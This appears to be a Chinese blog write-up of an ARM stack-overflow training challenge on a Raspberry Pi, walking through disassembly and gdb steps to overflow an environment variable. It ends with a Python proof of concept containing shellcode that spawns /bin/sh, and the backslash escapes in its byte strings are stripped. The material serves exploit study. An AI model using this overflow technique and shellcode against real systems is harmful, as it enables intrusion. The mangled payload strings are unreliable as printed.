    000104e4 :
       104e4:    e92d4800     push    {fp, lr}
       104e8:    e28db004     add    fp, sp, #4
       104ec:    e24dd050     sub    sp, sp, #80    ; 0x50
       104f0:    e50b0050     str    r0, [fp, #-80]    ; 0xffffffb0
       104f4:    e50b1054     str    r1, [fp, #-84]    ; 0xffffffac
       104f8:    e59f006c     ldr    r0, [pc, #108]    ; 1056c 
       104fc:    ebffff9c     bl    10374 
       10500:    e50b0008     str    r0, [fp, #-8]
       10504:    e51b3008     ldr    r3, [fp, #-8]
       10508:    e3530000     cmp    r3, #0
       1050c:    1a000002     bne    1051c 
       10510:    e3a00001     mov    r0, #1
       10514:    e59f1054     ldr    r1, [pc, #84]    ; 10570 
       10518:    ebffffa1     bl    103a4 
       1051c:    e3a03000     mov    r3, #0
       10520:    e50b300c     str    r3, [fp, #-12]
       10524:    e24b304c     sub    r3, fp, #76    ; 0x4c
       10528:    e1a00003     mov    r0, r3
       1052c:    e51b1008     ldr    r1, [fp, #-8]
       10530:    ebffff8c     bl    10368 
       10534:    e51b300c     ldr    r3, [fp, #-12]
       10538:    e59f2034     ldr    r2, [pc, #52]    ; 10574 
       1053c:    e1530002     cmp    r3, r2
       10540:    1a000002     bne    10550 
       10544:    e59f002c     ldr    r0, [pc, #44]    ; 10578 
       10548:    ebffff8c     bl    10380 
       1054c:    ea000003     b    10560 
       10550:    e51b300c     ldr    r3, [fp, #-12]
       10554:    e59f0020     ldr    r0, [pc, #32]    ; 1057c 
       10558:    e1a01003     mov    r1, r3
       1055c:    ebffff7e     bl    1035c 
       10560:    e1a00003     mov    r0, r3
       10564:    e24bd004     sub    sp, fp, #4
       10568:    e8bd8800     pop    {fp, pc}
       1056c:    000105f4     .word    0x000105f4
       10570:    000105fc     .word    0x000105fc
       10574:    0d0a0d0a     .word    0x0d0a0d0a
       10578:    0001062c     .word    0x0001062c
       1057c:    00010658     .word    0x00010658
  1. gdb调试
  * 先在getenv下个断点，`b *0x000104fc`，然后`r`运行起来，就可以根据上面的反汇编代码，获取特定环境变量名称的地址`x/1wx 0x1056c`,获取到地址再获取字符串的值，命令如下，得到字符串`GREENIE`，获取到环境变量值，我们就可以设置对象的环境变量来满足它的要求 
        gef> x/1wx 0x1056c
    0x1056c :    0x000105f4
    gef> x/s 0x000105f4
    0x105f4:    "GREENIE"
  * 设置环境变量`export`，这里使用命令`export GREENIE=A`设置环境变量，可以使用`export`来检查是否成功加入。成功设置好环境变量后，继续执行，它会将环境变量值赋到`fp-#76`栈地址内 
        pi[@raspberrypi](https://github.com/raspberrypi "@raspberrypi"):~/Desktop/ARM-challenges $ export GREENIE=A
    pi[@raspberrypi](https://github.com/raspberrypi "@raspberrypi"):~/Desktop/ARM-challenges $ export
    declare -x GREENIE="A"
    declare -x HOME="/home/pi"
  * `Try again`的回显  
比较栈内数据`[r11, #-12]（0xbefff0d0）`和`[pc, #52]`处的数据大小，如果不相等就会跳转到`0x10550`，随后输出`Try
again`，让再次尝试
        ->   0x10534         ldr    r3,  [r11,  #-12]
       0x10538         ldr    r2,  [pc,  #52]    ; 0x10574 
       0x1053c         cmp    r3,  r2
       0x10540         bne    0x10550 
    ........
     ldr    r3, [fp, #-12]
    10554:    e59f0020     ldr    r0, [pc, #32]    ; 1057c 
    10558:    e1a01003     mov    r1, r3
    1055c:    ebffff7e     bl    1035c 
    10560:    e1a00003     mov    r0, r3
    10564:    e24bd004     sub    sp, fp, #4
    10568:    e8bd8800     pop    {fp, pc}
[pc, #52]的值可以运行`x/4b`，查看
        gef> x/4b 0x10574
    0x10574 :    0x0a    0x0d    0x0a    0x0d
  * `终点分支`：很明显我们需要跳转到下面的代码处，来攻破这个程序，所以需要计算满足上面的比较，让[r11, #-12]处的值为`0x0a 0x0d 0x0a 0x0d`，所以我们需要利用`溢出`来实现这个比较的相等，再往前逆向，我们需要使用环境变量`GREENIE`的值来溢出覆盖到`[r11, #-12]`
环境变量值起点地址：`fp-#76`  
需要覆盖的地址：`fp-#12`（[r11, #-12]）  
使用的覆盖值：`0x0a 0x0d 0x0a 0x0d`
**最后计算** ：`64`字节的padding + `4`字节的覆盖值
       10534:    e51b300c     ldr    r3, [fp, #-12]
       10538:    e59f2034     ldr    r2, [pc, #52]    ; 10574 
       1053c:    e1530002     cmp    r3, r2
       10540:    1a000002     bne    10550 
       10544:    e59f002c     ldr    r0, [pc, #44]    ; 10578 
       10548:    ebffff8c     bl    10380 
       1054c:    ea000003     b    10560 
    ........
       10560:    e1a00003     mov    r0, r3
       10564:    e24bd004     sub    sp, fp, #4
       10568:    e8bd8800     pop    {fp, pc}
  * 覆盖执行  
利用`export
GREENIE=1111111111111111111111111111111111111111111111111111111111111111`干好覆盖64字节的数据到`0xbefff0d0`处，这64字节的padding成功完成他们的任务，我们再加上4字节的`0x0a
0x0d 0x0a 0x0d(nrnr)`即可，使用命令`export
GREENIE=$'1111111111111111111111111111111111111111111111111111111111111111nrnr'`即可写入特殊字符到环境变量
    gef> x/30wx 0xbefff090
    0xbefff090:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff0a0:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff0b0:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff0c0:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff0d0:    0x00000000
破解成功
    pi@raspberrypi:~/Desktop/ARM-challenges $  ./stack2
    you have correctly modified the variable
如果想用到exp：第一：`获取栈内返回地址的下一个栈地址：0xbeffeff0和溢出点到返回地址的长度`，第二：使用命令`export $(python
poc.py)`把exp代码写到环境变量中
    import struct
    padding = "1111111111111111111111111111111111111111111111111111111111111111111111111111"
    return_addr = struct.pack("I", 0xbeffeff0)
    payload1 = "x01x30x8fxe2x13xffx2fxe1x01x21x48x1cx92x1axc8x27x51x37x01xdfx04x1cx14xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx60x1cx01x38x02x21x02x37x01xdfx60x1cx01x38x49x40x52x40x01x37x01xdfx04x1cx60x1cx01x38x49x1ax3fx27x01xdfxc0x46x60x1cx01x38x01x21x01xdfx60x1cx01x38x02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58"
    print padding + return_addr + "x90"*100 + payload1
## 小结
从上面两个例子，写出一些本人的个人分析流程，如果有大佬看到不足的地方希望帮忙指教，thanks！
主要流程也就是，拿到样本文件后：了解是什么文件，有什么安全机制，然后看汇编代码了解代码逻辑。
## 附录：
> [1]
> [linux程序的常用保护机制](https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/)  
>  [2] [ARM汇编之堆栈溢出实战分析（GDB）](https://www.anquanke.com/post/id/169071)  
>  [3] [How do I actually write to an environment
> variable?](https://stackoverflow.com/questions/41309822/how-do-i-actually-> write-n-r-to-an-environment-variable)